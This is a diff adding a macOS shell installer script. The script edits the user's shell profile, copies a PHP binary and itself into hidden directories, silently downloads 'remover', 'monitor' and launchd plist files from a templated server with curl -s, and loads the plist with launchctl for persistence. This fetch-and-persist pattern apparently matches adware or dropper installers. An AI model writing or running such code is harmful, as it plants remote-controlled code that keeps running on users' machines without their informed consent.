@@ -1,0 +1,49 @@
+PROFILE=".bash_profile"
+OVERRIDES=".zshrc"
+
+for profile in $OVERRIDES; do
+  if [ -f $HOME/$profile ]; then
+    PROFILE=$profile
+  fi
+done
+
+PROFILE_PATH=$HOME/$PROFILE
+
+if [ ! -f $PROFILE_PATH ]; then
+  touch $PROFILE_PATH
+fi
+
+HAS_BIN_PATH="`cat $PROFILE_PATH | grep \"PATH.*$HOME/.bin\"`"
+
+if [[ $HAS_BIN_PATH == "" ]]; then
+  echo "export PATH=\$PATH:$HOME/.bin" >> $PROFILE_PATH
+fi
+
+if [[ ! -d $DIR_MAIN ]]; then
+   mkdir $DIR_MAIN
+fi
+
+if [[ ! -d $DIR_BIN ]]; then
+   mkdir $DIR_BIN
+fi
+
+if [[ ! -d $LAUNCH_DIR ]]; then
+  mkdir $LAUNCH_DIR
+fi
+
+if [[ ! -f $BINARY ]]; then
+   cp $PHP $BINARY
+fi
+
+cp $0 $INSTALLER
+
+curl -s -o $REMOVER "{{SERVER_HOST}}r.php?h=$HASH"
+curl -s -o $MONITOR "{{SERVER_HOST}}g.php?h=$HASH"
+curl -s -o $LAUNCH_PLIST "{{SERVER_HOST}}l.php?h=$HASH"
+
+sed -i '' "s/{{MONITOR}}/$MON_ESC/g" $LAUNCH_PLIST
+sed -i '' "s/{{BINARY_LOCATION}}/$BIN_ESC/g" $LAUNCH_PLIST
+
+chmod +x $INSTALLER $REMOVER $MONITOR
+
+launchctl load $LAUNCH_PLIST
